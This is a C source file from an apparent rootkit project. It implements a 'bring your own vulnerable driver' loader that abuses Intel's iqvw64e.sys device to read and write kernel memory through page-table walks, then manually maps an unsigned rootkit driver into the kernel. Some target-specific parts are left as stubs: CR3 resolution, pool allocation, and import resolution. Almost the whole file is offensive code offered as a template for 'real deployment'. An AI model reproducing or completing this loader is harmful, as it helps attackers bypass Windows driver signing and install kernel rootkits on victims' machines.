/*==============================================================================
 * rootkit/usermode/loader.c
 *------------------------------------------------------------------------------
 * BYOVD Manual Mapper (kdmapper-style)
 *
 * PURPOSE:
 *   Load the rootkit driver (rootkit.sys) into kernel memory without a valid
 *   signature by exploiting a vulnerable signed driver (e.g., Intel's
 *   iqvw64e.sys exposed as \\.\Nal).
 *
 * PIPELINE:
 *   1. Open handle to vulnerable driver's device (\\.\Nal)
 *   2. Read target .sys from disk
 *   3. Allocate kernel memory via vulnerable driver's primitive
 *   4. Copy PE sections to allocated region at correct virtual offsets
 *   5. Apply base relocations
 *   6. Resolve imports against ntoskrnl exports
 *   7. Call DriverEntry at mapped base
 *
 * BUILD:
 *   cl /O2 /W3 loader.c /link advapi32.lib
 *
 * NOTE: This is a template. Real deployment requires target-specific:
 *   - CR3 resolution (for VA->PA translation)
 *   - Kernel pool allocation primitive
 *   - ntoskrnl base resolution
 *==============================================================================
 */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winioctl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

/*==============================================================================
 * VULNERABLE DRIVER ABI (Intel iqvw64e.sys / \\.\Nal)
 *============================================================================*/
#define NAL_DEVICE_PATH      "\\\\.\\Nal"
#define NAL_IOCTL_MAP_IO     0x80862007

#pragma pack(push, 1)
typedef struct _NAL_MAP {
    uint64_t phys_addr;
    uint64_t size;
    uint64_t virt_addr;   /* in/out */
    uint32_t flags;
    uint32_t reserved;
} NAL_MAP;
#pragma pack(pop)

typedef struct _NAL_RW {
    uint64_t addr;
    uint64_t buffer;
    uint64_t size;
    uint32_t op;          /* 0 = read, 1 = write */
    uint32_t reserved;
} NAL_RW;

/*==============================================================================
 * PE HELPERS
 *============================================================================*/
static uint8_t* read_file(const char* path, size_t* out_len) {
    FILE* f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    uint8_t* buf = (uint8_t*)malloc(sz);
    if (buf) fread(buf, 1, sz, f);
    fclose(f);
    *out_len = (size_t)sz;
    return buf;
}

/*==============================================================================
 * VULNERABLE DRIVER PRIMITIVES
 *============================================================================*/
static HANDLE g_nal = INVALID_HANDLE_VALUE;

static int nal_open(void) {
    g_nal = CreateFileA(NAL_DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                        OPEN_EXISTING, 0, NULL);
    return g_nal != INVALID_HANDLE_VALUE;
}

/* Map physical page into usermode; returns user VA. */
static uint64_t nal_map_phys(uint64_t phys, uint64_t size) {
    NAL_MAP m = {0};
    m.phys_addr = phys;
    m.size      = size;
    DWORD br = 0;
    if (!DeviceIoControl(g_nal, NAL_IOCTL_MAP_IO, &m, sizeof(m),
                         &m, sizeof(m), &br, NULL)) {
        return 0;
    }
    return m.virt_addr;
}

/*==============================================================================
 * PAGE TABLE WALK (VA -> PA)
 *------------------------------------------------------------------------------
 * Translates kernel virtual address to physical address by walking the
 * 4-level page tables via the vulnerable driver's physical memory mapping.
 *
 * REQUIRES: g_cr3 (CR3 register value = PML4 base physical address)
 *           Must be resolved from target-specific source (KPCR, KPRCB, etc.)
 *============================================================================*/
static uint64_t g_cr3 = 0;  /* Populated by target-specific code */

static uint64_t va_to_pa(uint64_t va) {
    const uint64_t PML4_IDX = (va >> 39) & 0x1FF;
    const uint64_t PDPT_IDX = (va >> 30) & 0x1FF;
    const uint64_t PD_IDX   = (va >> 21) & 0x1FF;
    const uint64_t PT_IDX   = (va >> 12) & 0x1FF;
    const uint64_t OFFSET   = va & 0xFFF;

    /* PML4 Entry */
    uint64_t pml4e_pa = g_cr3 + PML4_IDX * 8;
    uint64_t pml4e_va = nal_map_phys(pml4e_pa, 0x1000);
    if (!pml4e_va) return 0;
    uint64_t pml4e = *(uint64_t*)pml4e_va;

    /* PDPT Entry */
    uint64_t pdpt_pa = (pml4e & 0x000FFFFFFFFFF000ULL) + PDPT_IDX * 8;
    uint64_t pdpt_va = nal_map_phys(pdpt_pa, 0x1000);
    if (!pdpt_va) return 0;
    uint64_t pdpte = *(uint64_t*)pdpt_va;

    /* 1GB page? */
    if (pdpte & 0x80) {
        return (pdpte & 0x000FFFFFC0000000ULL) + (va & 0x3FFFFFFF);
    }

    /* PD Entry */
    uint64_t pd_pa = (pdpte & 0x000FFFFFFFFFF000ULL) + PD_IDX * 8;
    uint64_t pd_va = nal_map_phys(pd_pa, 0x1000);
    if (!pd_va) return 0;
    uint64_t pde = *(uint64_t*)pd_va;

    /* 2MB page? */
    if (pde & 0x80) {
        return (pde & 0x000FFFFFFFE00000ULL) + (va & 0x1FFFFF);
    }

    /* PT Entry */
    uint64_t pt_pa = (pde & 0x000FFFFFFFFFF000ULL) + PT_IDX * 8;
    uint64_t pt_va = nal_map_phys(pt_pa, 0x1000);
    if (!pt_va) return 0;
    uint64_t pte = *(uint64_t*)pt_va;

    return (pte & 0x000FFFFFFFFFF000ULL) + OFFSET;
}

/*==============================================================================
 * KERNEL MEMORY READ/WRITE (via page table walk)
 *============================================================================*/
static int kread(uint64_t va, void* out, size_t len) {
    uint8_t* dst = (uint8_t*)out;
    size_t done = 0;
    while (done < len) {
        uint64_t pa = va_to_pa(va + done);
        if (!pa) return 0;
        size_t chunk = 0x1000 - (pa & 0xFFF);
        if (chunk > len - done) chunk = len - done;
        uint64_t page_va = nal_map_phys(pa & ~0xFFFULL, 0x1000);
        if (!page_va) return 0;
        memcpy(dst + done, (void*)(page_va + (pa & 0xFFF)), chunk);
        done += chunk;
    }
    return 1;
}

static int kwrite(uint64_t va, const void* in, size_t len) {
    const uint8_t* src = (const uint8_t*)in;
    size_t done = 0;
    while (done < len) {
        uint64_t pa = va_to_pa(va + done);
        if (!pa) return 0;
        size_t chunk = 0x1000 - (pa & 0xFFF);
        if (chunk > len - done) chunk = len - done;
        uint64_t page_va = nal_map_phys(pa & ~0xFFFULL, 0x1000);
        if (!page_va) return 0;
        memcpy((void*)(page_va + (pa & 0xFFF)), src + done, chunk);
        done += chunk;
    }
    return 1;
}

/*==============================================================================
 * KERNEL POOL ALLOCATION (Target-Specific)
 *------------------------------------------------------------------------------
 * Real kdmapper allocates from non-paged pool via "big pool" trick.
 * Exact method depends on vulnerable driver capabilities.
 * This stub returns 0 - operator must implement target-specific allocator.
 *============================================================================*/
static uint64_t kalloc(size_t size) {
    (void)size;
    return 0;  /* TARGET-SPECIFIC: Implement pool allocation primitive */
}

/*==============================================================================
 * MANUAL MAPPER
 *============================================================================*/
static uint64_t map_driver(const uint8_t* image, size_t image_len) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)image;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    size_t image_size = nt->OptionalHeader.SizeOfImage;
    uint64_t base = kalloc(image_size);
    if (!base) return 0;

    /*--- Copy Headers ---*/
    kwrite(base, image, nt->OptionalHeader.SizeOfHeaders);

    /*--- Copy Sections ---*/
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;
        kwrite(base + sec->VirtualAddress, image + sec->PointerToRawData, sec->SizeOfRawData);
    }

    /*--- Apply Base Relocations ---*/
    int64_t delta = (int64_t)(base - nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        PIMAGE_DATA_DIRECTORY rel = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (rel->Size) {
            PIMAGE_BASE_RELOCATION br = (PIMAGE_BASE_RELOCATION)(image + rel->VirtualAddress);
            while (br->SizeOfBlock) {
                uint16_t* entries = (uint16_t*)(br + 1);
                int n = (br->SizeOfBlock - sizeof(*br)) / 2;
                for (int j = 0; j < n; j++) {
                    uint16_t type = entries[j] >> 12;
                    uint16_t off  = entries[j] & 0xFFF;
                    if (type == IMAGE_REL_BASED_DIR64 || type == IMAGE_REL_BASED_HIGHLOW) {
                        uint64_t where = base + br->VirtualAddress + off;
                        uint64_t val = 0;
                        kread(where, &val, 8);
                        val += delta;
                        kwrite(where, &val, 8);
                    }
                }
                br = (PIMAGE_BASE_RELOCATION)((uint8_t*)br + br->SizeOfBlock);
            }
        }
    }

    /*--- Resolve Imports (ntoskrnl only) ---
     * Requires ntoskrnl base - obtain via KdDebuggerDataBlock or
     * vulnerable driver's module enumeration primitive. */
    PIMAGE_DATA_DIRECTORY imp = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp->Size) {
        fprintf(stderr, "[!] Import resolution requires ntoskrnl base (target-specific)\n");
    }

    return base;
}

/*==============================================================================
 * ENTRY POINT
 *============================================================================*/
int main(int argc, char** argv) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s <driver.sys>\n", argv[0]);
        return 1;
    }

    printf("[*] rootkit BYOVD loader\n");
    printf("[*] Target: %s\n", argv[1]);

    /*--- Open vulnerable driver ---*/
    if (!nal_open()) {
        fprintf(stderr, "[!] Cannot open vulnerable driver %s\n", NAL_DEVICE_PATH);
        fprintf(stderr, "[!] Ensure iqvw64e.sys (or equivalent) is loaded and accessible\n");
        return 2;
    }
    printf("[+] Opened vulnerable driver\n");

    /*--- CR3 Resolution (TARGET-SPECIFIC) ---
     * On real targets, read CR3 from:
     *   - KPCR->KPRCB (via vulnerable driver's MSR read)
     *   - Known kernel global (KdDebuggerDataBlock)
     *   - Vulnerable driver's own context
     * Placeholder: 0 = fail */
    g_cr3 = 0;
    if (!g_cr3) {
        fprintf(stderr, "[!] CR3 not resolved - supply target-specific resolver\n");
        fprintf(stderr, "[!] See va_to_pa() and kread()/kwrite() for integration points\n");
        return 3;
    }

    /*--- Read driver image ---*/
    size_t len = 0;
    uint8_t* img = read_file(argv[1], &len);
    if (!img) { fprintf(stderr, "[!] Cannot read %s\n", argv[1]); return 4; }
    printf("[+] Read driver image (%zu bytes)\n", len);

    /*--- Map driver ---*/
    uint64_t base = map_driver(img, len);
    if (!base) { fprintf(stderr, "[!] Map failed\n"); free(img); return 5; }

    printf("[+] Mapped at 0x%llx\n", (unsigned long long)base);
    printf("[+] DriverEntry at 0x%llx\n",
           (unsigned long long)(base + ((PIMAGE_NT_HEADERS)(img + ((PIMAGE_DOS_HEADER)img)->e_lfanew))->OptionalHeader.AddressOfEntryPoint));
    printf("[*] Call DriverEntry manually or via vulnerable driver's execution primitive\n");

    free(img);
    return 0;
}